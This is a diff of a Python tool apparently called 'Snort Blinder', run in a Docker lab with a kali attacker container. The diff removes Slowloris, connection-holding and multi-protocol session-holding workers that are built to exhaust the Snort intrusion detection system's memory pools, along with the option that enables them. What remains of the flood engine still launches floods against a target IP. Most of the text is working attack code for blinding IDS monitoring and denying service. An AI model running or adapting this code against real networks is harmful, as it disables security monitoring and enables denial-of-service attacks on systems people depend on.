@@ -429,316 +429,6 @@ def icmp_worker(target):
     sock.close()
 
 
-# -- Connection Holder Worker (targets 0/4/80 byte blocks) --------------------
-_HOLDER_PORTS = [21, 22, 23, 25, 53, 80, 135, 389, 445, 554, 8080]
-_HOLDER_POOL_SIZE = 200
-
-def connection_holder_worker(target, stop_event_ref):
-    """Hold hundreds of TCP connections open simultaneously.
-
-    Each open TCP flow forces Snort to allocate session/flow tracking
-    structures from the 0, 4, and 80-byte pools and HOLD them for the
-    connection's lifetime. By maintaining ~200 open connections per thread,
-    we pin those allocations indefinitely.
-
-    Periodically sends a keep-alive byte to prevent Snort from timing out
-    the session, and rotates ~10% of connections to create churn that
-    prevents Snort from optimizing idle flows away.
-    """
-    pool = [None] * _HOLDER_POOL_SIZE
-    local_pkts = 0
-    local_bytes = 0
-    local_errs = 0
-
-    def _open(slot):
-        port = random.choice(_HOLDER_PORTS)
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
-                         struct.pack('ii', 1, 0))
-            s.settimeout(0.05)
-            s.connect((target, port))
-            s.settimeout(0.02)
-            pool[slot] = s
-            return True
-        except OSError:
-            pool[slot] = None
-            try:
-                s.close()
-            except Exception:
-                pass
-            return False
-
-    def _close(slot):
-        s = pool[slot]
-        pool[slot] = None
-        if s:
-            try:
-                s.close()
-            except Exception:
-                pass
-
-    for i in range(_HOLDER_POOL_SIZE):
-        if stop_event_ref.is_set():
-            break
-        _open(i)
-
-    while not stop_event_ref.is_set():
-        for slot in range(_HOLDER_POOL_SIZE):
-            if stop_event_ref.is_set():
-                break
-            s = pool[slot]
-            if s is None:
-                if _open(slot):
-                    local_pkts += 1
-                    local_bytes += 1
-                else:
-                    local_errs += 1
-                continue
-
-            if random.random() < 0.10:
-                _close(slot)
-                _open(slot)
-                local_pkts += 1
-                local_bytes += 1
-                continue
-
-            try:
-                s.send(os.urandom(1))
-                local_pkts += 1
-                local_bytes += 1
-            except OSError:
-                _close(slot)
-                local_errs += 1
-
-        if local_pkts + local_errs >= BATCH_SIZE:
-            stats.record_batch("conn_hold", local_pkts, local_bytes, local_errs)
-            local_pkts = local_bytes = local_errs = 0
-
-        time.sleep(0.1)
-
-    for slot in range(_HOLDER_POOL_SIZE):
-        _close(slot)
-    if local_pkts or local_errs:
-        stats.record_batch("conn_hold", local_pkts, local_bytes, local_errs)
-
-
-# -- Slowloris HTTP Worker (targets 256/1550 byte blocks) ---------------------
-_SLOWLORIS_POOL_SIZE = 150
-
-def slowloris_worker(target, stop_event_ref):
-    """Send partial HTTP requests that never complete (Slowloris pattern).
-
-    Each incomplete HTTP request forces Snort's http_inspect to allocate
-    header parsing buffers from the 256 and 1550-byte pools and HOLD them
-    while waiting for the rest of the headers. By maintaining ~150 partial
-    requests simultaneously, we pin those allocations.
-
-    Sends one header line every ~2 seconds to keep the connection alive
-    without ever sending the final \\r\\n\\r\\n that would complete the request.
-    """
-    pool = [None] * _SLOWLORIS_POOL_SIZE
-    header_idx = [0] * _SLOWLORIS_POOL_SIZE
-    local_pkts = 0
-    local_bytes = 0
-    local_errs = 0
-
-    fake_headers = [
-        b"X-Fuzz-A: " + os.urandom(120).hex().encode()[:200] + b"\r\n",
-        b"X-Fuzz-B: " + os.urandom(120).hex().encode()[:200] + b"\r\n",
-        b"X-Fuzz-C: " + os.urandom(120).hex().encode()[:200] + b"\r\n",
-        b"Accept-Language: en-US,en;q=0.9,fr;q=0.8,de;q=0.7\r\n",
-        b"Accept-Encoding: gzip, deflate, br\r\n",
-        b"Cache-Control: no-cache, no-store, must-revalidate\r\n",
-        b"Connection: keep-alive\r\n",
-        b"X-Request-ID: " + os.urandom(16).hex().encode() + b"\r\n",
-    ]
-
-    def _open(slot):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(0.1)
-            s.connect((target, 80))
-            s.settimeout(0.05)
-            initial = (f"GET /{os.urandom(8).hex()} HTTP/1.1\r\n"
-                       f"Host: {target}\r\n").encode()
-            s.send(initial)
-            pool[slot] = s
-            header_idx[slot] = 0
-            return True
-        except OSError:
-            pool[slot] = None
-            try:
-                s.close()
-            except Exception:
-                pass
-            return False
-
-    def _close(slot):
-        s = pool[slot]
-        pool[slot] = None
-        if s:
-            try:
-                s.close()
-            except Exception:
-                pass
-
-    for i in range(_SLOWLORIS_POOL_SIZE):
-        if stop_event_ref.is_set():
-            break
-        _open(i)
-
-    while not stop_event_ref.is_set():
-        for slot in range(_SLOWLORIS_POOL_SIZE):
-            if stop_event_ref.is_set():
-                break
-            s = pool[slot]
-            if s is None:
-                if _open(slot):
-                    local_pkts += 1
-                    local_bytes += 40
-                else:
-                    local_errs += 1
-                continue
-
-            hdr = fake_headers[header_idx[slot] % len(fake_headers)]
-            header_idx[slot] += 1
-            try:
-                s.send(hdr)
-                local_pkts += 1
-                local_bytes += len(hdr)
-            except OSError:
-                _close(slot)
-                _open(slot)
-                local_errs += 1
-
-        if local_pkts + local_errs >= BATCH_SIZE:
-            stats.record_batch("slowloris", local_pkts, local_bytes, local_errs)
-            local_pkts = local_bytes = local_errs = 0
-
-        time.sleep(0.5)
-
-    for slot in range(_SLOWLORIS_POOL_SIZE):
-        _close(slot)
-    if local_pkts or local_errs:
-        stats.record_batch("slowloris", local_pkts, local_bytes, local_errs)
-
-
-# -- Multi-protocol Session Holder (targets 2048/1550 byte blocks) -----------
-def multiproto_session_holder(target, stop_event_ref):
-    """Hold open sessions across multiple protocol inspectors simultaneously.
-
-    Opens connections to FTP (21), SMTP (25), SSH (22), HTTP (80), and
-    SMB (445) and sends valid protocol initiation bytes to trigger Snort's
-    respective application-layer inspectors. Each active inspector allocates
-    protocol-specific state from the 1550 and 2048-byte pools.
-
-    Keeps sessions alive by sending periodic protocol-appropriate data
-    without completing any protocol handshake.
-    """
-    proto_inits = {
-        21:  b"USER anonymous\r\n",
-        25:  b"EHLO fuzz.local\r\n",
-        22:  b"SSH-2.0-OpenSSH_8.9\r\n",
-        80:  b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 999999\r\n\r\n",
-        445: b"\x00\x00\x00\x45\xffSMB\x72\x00\x00\x00\x00",
-        389: b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00",
-    }
-    keep_alive = {
-        21:  b"NOOP\r\n",
-        25:  b"NOOP\r\n",
-        22:  os.urandom(32),
-        80:  os.urandom(64),
-        445: os.urandom(32),
-        389: b"\x30\x05\x02\x01\x02\x42\x00",
-    }
-
-    _POOL = 60
-    pool = [None] * _POOL
-    pool_port = [0] * _POOL
-    ports = list(proto_inits.keys())
-    local_pkts = 0
-    local_bytes = 0
-    local_errs = 0
-
-    def _open(slot):
-        port = random.choice(ports)
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
-                         struct.pack('ii', 1, 0))
-            s.settimeout(0.1)
-            s.connect((target, port))
-            s.settimeout(0.05)
-            init = proto_inits[port]
-            s.send(init)
-            pool[slot] = s
-            pool_port[slot] = port
-            return True, len(init)
-        except OSError:
-            pool[slot] = None
-            try:
-                s.close()
-            except Exception:
-                pass
-            return False, 0
-
-    def _close(slot):
-        s = pool[slot]
-        pool[slot] = None
-        if s:
-            try:
-                s.close()
-            except Exception:
-                pass
-
-    for i in range(_POOL):
-        if stop_event_ref.is_set():
-            break
-        ok, nb = _open(i)
-        if ok:
-            local_pkts += 1
-            local_bytes += nb
-
-    while not stop_event_ref.is_set():
-        for slot in range(_POOL):
-            if stop_event_ref.is_set():
-                break
-            s = pool[slot]
-            if s is None:
-                ok, nb = _open(slot)
-                if ok:
-                    local_pkts += 1
-                    local_bytes += nb
-                else:
-                    local_errs += 1
-                continue
-
-            port = pool_port[slot]
-            ka = keep_alive.get(port, os.urandom(8))
-            try:
-                s.send(ka)
-                local_pkts += 1
-                local_bytes += len(ka)
-            except OSError:
-                _close(slot)
-                local_errs += 1
-
-        if local_pkts + local_errs >= BATCH_SIZE:
-            stats.record_batch("proto_hold", local_pkts, local_bytes, local_errs)
-            local_pkts = local_bytes = local_errs = 0
-
-        time.sleep(0.3)
-
-    for slot in range(_POOL):
-        _close(slot)
-    if local_pkts or local_errs:
-        stats.record_batch("proto_hold", local_pkts, local_bytes, local_errs)
-
-
 # -- Canary sender (TCP from inside kali) -------------------------------------
 def canary_sender(target, interval=5.0):
     time.sleep(8)
@@ -810,8 +500,7 @@ INTENSITY_PRESETS = {
 # -- Flood engine main --------------------------------------------------------
 def run_flood(target, duration, phase_duration, intensity=1,
               proto_filter=None, stats_file_override=None,
-              inject_rate=0.0, inject_string=None,
-              deplete_all=False):
+              inject_rate=0.0, inject_string=None):
     global INJECT_RATE, INJECT_STRING
     INJECT_RATE = max(0.0, min(1.0, inject_rate))
     if inject_string:
@@ -897,43 +586,6 @@ def run_flood(target, duration, phase_duration, intensity=1,
         icmp_thread = threading.Thread(target=icmp_worker, args=(target,), daemon=True, name="icmp")
         workers.append(icmp_thread)
 
-    # -- Deplete-all: extra workers targeting small block pools (0-2048) -------
-    _deplete_all_count = 0
-    if deplete_all:
-        _HOLD_THREADS = min(intensity * 2, 8)
-        _SLOWLORIS_THREADS = min(intensity * 2, 6)
-        _PROTO_THREADS = min(intensity * 2, 6)
-
-        for i in range(_HOLD_THREADS):
-            w = threading.Thread(target=connection_holder_worker,
-                                 args=(target, stop_event),
-                                 daemon=True, name=f"conn-hold-{i}")
-            workers.append(w)
-            _deplete_all_count += 1
-
-        for i in range(_SLOWLORIS_THREADS):
-            w = threading.Thread(target=slowloris_worker,
-                                 args=(target, stop_event),
-                                 daemon=True, name=f"slowloris-{i}")
-            workers.append(w)
-            _deplete_all_count += 1
-
-        for i in range(_PROTO_THREADS):
-            w = threading.Thread(target=multiproto_session_holder,
-                                 args=(target, stop_event),
-                                 daemon=True, name=f"proto-hold-{i}")
-            workers.append(w)
-            _deplete_all_count += 1
-
-        _total_held = (_HOLD_THREADS * _HOLDER_POOL_SIZE +
-                       _SLOWLORIS_THREADS * _SLOWLORIS_POOL_SIZE +
-                       _PROTO_THREADS * 60)
-        print(f"  [*] DEPLETE-ALL: +{_deplete_all_count} workers holding "
-              f"~{_total_held} concurrent sessions", flush=True)
-        print(f"      conn-hold:{_HOLD_THREADS} (x{_HOLDER_POOL_SIZE}), "
-              f"slowloris:{_SLOWLORIS_THREADS} (x{_SLOWLORIS_POOL_SIZE}), "
-              f"proto-hold:{_PROTO_THREADS} (x60)", flush=True)
-
     canary_thread = threading.Thread(target=canary_sender, args=(target,), daemon=True, name="canary")
     writer_thread = threading.Thread(target=lambda: _stats_writer_loop(sf), daemon=True, name="stats-writer")
 
@@ -1016,8 +668,7 @@ def get_alert_count(pattern="\\[\\*\\*\\]"):
     return 0
 
 
-def run_orchestrator(duration, phase_duration, intensity=1,
-                     n_processes_override=None, deplete_all=False):
+def run_orchestrator(duration, phase_duration, intensity=1, n_processes_override=None):
     print("=" * 78)
     print("  SNORT BLINDER - Host Orchestrator")
     print("=" * 78)
@@ -1115,8 +766,6 @@ def run_orchestrator(duration, phase_duration, intensity=1,
     print(f"  [*] Intensity: {intensity} [{preset['label']}] — "
           f"UDP:{preset['udp']}/proto, TCP:{preset['tcp']}/proto")
     print(f"  [*] Total workers: ~{total_threads} across {n_procs} processes")
-    if deplete_all:
-        print(f"  [*] DEPLETE-ALL MODE: targeting ALL block pools (0-2048 + 2560)")
     print(f"  [*] Duration: {duration}s")
     for gi, g in enumerate(proto_groups):
         print(f"      Process {gi}: {', '.join(g)}")
@@ -1127,12 +776,11 @@ def run_orchestrator(duration, phase_duration, intensity=1,
         sf = f"/tmp/blinder_stats_{gi}.json"
         stats_files.append(sf)
         proto_list = ",".join(group)
-        deplete_flag = " --deplete-all" if deplete_all else ""
         flood_cmd = (
             f"cd /fuzzer && python3 Testing/snort_blinder.py "
             f"--flood --target {TARGET_IP} --duration {duration} "
             f"--phase-duration {phase_duration} --intensity {intensity} "
-            f"--protocols {proto_list} --stats-file {sf}{deplete_flag}"
+            f"--protocols {proto_list} --stats-file {sf}"
         )
         proc = subprocess.Popen(
             ["docker", "exec", ATTACKER, "bash", "-c", flood_cmd],
@@ -1321,22 +969,16 @@ def main():
                              "detection string into (so IPS alerts scale with volume)")
     parser.add_argument("--inject-string", type=str, default=None,
                         help="Detection string to embed (default: EICAR content)")
-    parser.add_argument("--deplete-all", action="store_true", default=True,
-                        help="Launch extra workers targeting ALL Snort block pools "
-                             "(0-2048 bytes) not just reassembly buffers (2560). "
-                             "Enabled by default.")
     args = parser.parse_args()
 
     if args.flood:
         pf = set(args.protocols.split(",")) if args.protocols else None
         run_flood(args.target, args.duration, args.phase_duration,
                   args.intensity, proto_filter=pf, stats_file_override=args.stats_file,
-                  inject_rate=args.inject_rate, inject_string=args.inject_string,
-                  deplete_all=True)
+                  inject_rate=args.inject_rate, inject_string=args.inject_string)
     else:
         run_orchestrator(args.duration, args.phase_duration, args.intensity,
-                         n_processes_override=args.processes,
-                         deplete_all=True)
+                         n_processes_override=args.processes)
 
 
 if __name__ == "__main__":
